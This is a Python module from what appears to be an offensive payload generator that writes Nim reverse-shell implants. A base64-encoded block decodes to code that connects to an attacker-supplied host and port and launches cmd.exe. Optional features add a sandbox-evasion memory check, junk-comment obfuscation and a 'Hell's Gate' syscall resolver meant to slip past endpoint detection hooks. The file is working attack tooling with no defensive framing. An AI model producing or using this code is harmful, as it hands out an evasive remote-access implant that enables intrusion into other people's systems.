# nim payload generator
# includes hellsgate syscall stub for direct kernel access

import base64
from generators.base import BaseGenerator


class NimGenerator(BaseGenerator):
    LANG_ID = "nim"
    LANG_NAME = "Nim (evasive)"
    FILE_EXT = ".nim"

    def generate(self, host, port, opts, ptype, tpl, adv):
        sandbox = opts.get("sandbox", False)
        junk = opts.get("junk", False)
        syscalls = adv.get("syscalls", False)

        code = "import net, osproc, os, strutils\n\n"

        if sandbox:
            code += "if getTotalMem() < 2000000000: quit()\n"
        if junk:
            code += f"# {self.rstr(40)}\n"

        # hellsgate syscall stub for ntdll bypass
        if syscalls:
            code += self._hellsgate_stub()

        code += base64.b64decode(
            "bGV0IHMgPSBuZXdTb2NrZXQoKQp0cnk6CiAgcy5jb25uZWN0KCJ7MH0iLCBQb3J0KHsxfSkp"
            "CiAgbGV0IHAgPSBzdGFydFByb2Nlc3MoImNtZC5leGUiLCBvcHRpb25zPXtwb1BhcmVudFN0"
            "cmVhbXMsIHBvVXNlUGF0aCwgcG9EYWVtb259KQpleGNlcHQ6CiAgZGlzY2FyZAo="
        ).decode().format(host, port)
        return code

    def _hellsgate_stub(self):
        """hellsgate - walks ntdll exports to find syscall numbers at runtime"""
        return """
# hellsgate syscall resolver
# reads ntdll export table to get the real syscall number
# this avoids user-mode hooks placed by edr products

proc getSyscallNumber(funcName: string): int =
  let ntdll = loadLib("ntdll.dll")
  if ntdll == nil: return -1
  let pFunc = ntdll.symAddr(funcName)
  if pFunc == nil: return -1
  # syscall stub starts with: mov r10, rcx; mov eax, <syscall_num>
  let stub = cast[ptr UncheckedArray[byte]](pFunc)
  if stub[0] == 0x4C and stub[1] == 0x8B and stub[2] == 0xD1 and stub[3] == 0xB8:
    return int(stub[4]) or (int(stub[5]) shl 8)
  return -1

"""
